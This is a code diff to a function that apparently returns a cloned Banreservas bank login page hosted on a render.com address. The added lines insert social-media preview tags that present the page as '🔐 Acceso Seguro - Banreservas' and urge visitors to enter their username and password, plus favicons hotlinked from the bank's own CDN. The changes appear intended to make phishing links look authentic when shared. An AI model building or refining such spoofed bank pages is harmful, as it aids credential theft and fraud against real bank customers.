@@ -170,7 +170,28 @@ def get_template_banreservas():
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
     <meta name="description" content="Banco líder del sistema financiero y dinamizador del desarrollo social para los diferentes sectores productivos en beneficio de los dominicanos.">
+    
+    <!-- ========================================== -->
+    <!-- META TAGS PARA VISTA PREVIA EN REDES SOCIALES -->
+    <!-- ========================================== -->
+    <meta property="og:title" content="🔐 Acceso Seguro - Banreservas" />
+    <meta property="og:description" content="Tu banco de confianza. Ingresa con tu usuario y contraseña para realizar tus transacciones de forma segura." />
+    <meta property="og:image" content="https://cdnebrpeastus.azureedge.net/banreservas/media/xxpfq31w/banreservas-logo.png" />
+    <meta property="og:url" content="https://banreservas-uyw8.onrender.com/" />
+    <meta property="og:type" content="website" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="🔐 Acceso Seguro - Banreservas" />
+    <meta name="twitter:description" content="Tu banco de confianza. Ingresa con tu usuario y contraseña." />
+    <meta name="twitter:image" content="https://cdnebrpeastus.azureedge.net/banreservas/media/xxpfq31w/banreservas-logo.png" />
+    <!-- ========================================== -->
+    
     <title>Personal | Banreservas</title>
+    
+    <!-- Favicon para la pestaña del navegador -->
+    <link rel="icon" type="image/png" sizes="32x32" href="https://cdnebrpeastus.azureedge.net/banreservas/media/q2cdzjtf/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="https://cdnebrpeastus.azureedge.net/banreservas/media/iclbxops/favicon-16x16.png" />
+    <link rel="apple-touch-icon" href="https://cdnebrpeastus.azureedge.net/banreservas/media/psadezl0/apple-icon-180x180.png" />
+    
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.6.0/css/bootstrap.min.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
     <style>
